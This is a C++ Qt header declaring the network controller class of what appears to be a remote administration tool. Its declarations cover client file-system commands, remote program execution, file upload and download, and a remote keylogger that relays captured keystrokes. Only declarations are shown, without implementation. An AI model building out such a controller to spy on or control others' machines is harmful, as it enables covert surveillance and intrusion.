#pragma once

#include				<map>
#include				<QObject>

#include				"RxWSocket.h"
#include				"RxUpAndDown.h"
#include				"RxClientInfos.h"
#include				"RxProtocol.h"

class					RxNetwork :
	public QObject
{
	Q_OBJECT

private:
	typedef		void	(RxNetwork::*packet_func)(RxClientInfos*, RxPacket*);

private:
	bool								_is_running;
	std::string							_port;
	std::map<int, RxClientInfos*>		_clientList;
	RxWSocket							_serverSock;
	RxUpAndDown							_upDown;
	std::map<unsigned int, packet_func>	_packet_func_map;

public:
	RxNetwork(const std::string&);
	~RxNetwork(void);

private:
	RxNetwork(void);

public:
	void				SetServerPort(const std::string& p)	{ this->_port = p; }
	const std::string&	GetServerPort() const				{ return (this->_port); }

public:
	bool				NetLoop();

private:
	bool				DisconnectClient(RxClientInfos*);

private:
	void				InitPacketFuncMap();
	void				TreatPacket(RxClientInfos*, RxPacket*);
	void				PacketIsIdentification(RxClientInfos*, RxPacket*);
	void				PacketAnswerVersion(RxClientInfos*, RxPacket*);
	void				PacketAnswerFs(RxClientInfos*, RxPacket*);
	void				PacketAnswerFsNext(RxClientInfos*, RxPacket*);
	void				PacketAnswerFsFailed(RxClientInfos*, RxPacket*);
	void				PacketAnswerCdOk(RxClientInfos*, RxPacket*);
	void				PacketAnswerCdFailed(RxClientInfos*, RxPacket*);
	void				PacketAnswerDeleteOk(RxClientInfos*, RxPacket*);
	void				PacketAnswerDeleteFailed(RxClientInfos*, RxPacket*);
	void				PacketAnswerCopyOk(RxClientInfos*, RxPacket*);
	void				PacketAnswerCopyFailed(RxClientInfos*, RxPacket*);
	void				PacketAnswerPasteOk(RxClientInfos*, RxPacket*);
	void				PacketAnswerPasteFailed(RxClientInfos*, RxPacket*);
	void				PacketAnswerRenameOk(RxClientInfos*, RxPacket*);
	void				PacketAnswerRenameFailed(RxClientInfos*, RxPacket*);
	void				PacketAnswerCreateFileOK(RxClientInfos*, RxPacket*);
	void				PacketAnswerCreateFileFailed(RxClientInfos*, RxPacket*);
	void				PacketAnswerExecOk(RxClientInfos*, RxPacket*);
	void				PacketAnswerExecFailed(RxClientInfos*, RxPacket*);
	void				PacketAnswerKeyLogOk(RxClientInfos*, RxPacket*);
	void				PacketAnswerKeyLogFailed(RxClientInfos*, RxPacket*);
	void				PacketAnswerKeyPressed(RxClientInfos*, RxPacket*);
	void				PacketAnswerKeyLogStopOk(RxClientInfos*, RxPacket*);
	void				PacketAnswerKeyLogStopFail(RxClientInfos*, RxPacket*);
	void				PacketAnswerDownloadOk(RxClientInfos*, RxPacket*);
	void				PacketAnswerDownloadFailed(RxClientInfos*, RxPacket*);
	void				PacketAnswerUploadOk(RxClientInfos*, RxPacket*);
	void				PacketAnswerUploadFail(RxClientInfos*, RxPacket*);

signals:
	/* From self */
	void				NewMonitorEventIncident(std::string);
	void				NewMonitorEventSendind(std::string, unsigned int);
	void				NewMonitorEventReception(std::string, unsigned int);
	void				NewUpDownEvent(std::string);
	void				NetAnswerKeyLogInfos(std::string, bool, std::string);
	void				ClientIdentified(std::string);
	void				ClientCrashed(std::string);
	void				ClientAnsVersion(std::string, std::string);
	void				ClientAnsFs(std::string, FileInfo);
	void				ClientAnsFsNext(std::string, FileInfo);
	void				ClientAnsKeyPressed(std::string, std::string);
	/* From UpDown */
	void				UpdnIncident(std::string);
	void				UpdnNewPartRec(int, int);
	void				UpdnDlFinished();
	void				UpdnNewPartSnd(int, int);
	void				UpdnUpFinished();

private:
	RxClientInfos*		GetClientByName(std::string&);

public slots:
	void				WinAskVer(std::string);
	void				WinAskFs(std::string);
	void				WinAskKeyLogInfos(std::string);
	void				WinAskCd(std::string, std::string);
	void				WinAskDel(std::string, std::string);
	void				WinAskCpy(std::string, std::string);
	void				WinAskPst(std::string);
	void				WinAskRnm(std::string, std::string, std::string);
	void				WinAskCrt(std::string, std::string, std::string);
	void				WinAskExe(std::string, std::string);
	void				WinAskAkl(std::string);
	void				WinAskOkl(std::string);
	void				WinAskCkl(std::string);
	void				WinAskDwn(std::string, std::string);
	void				WinAskUpl(std::string, std::string);
};

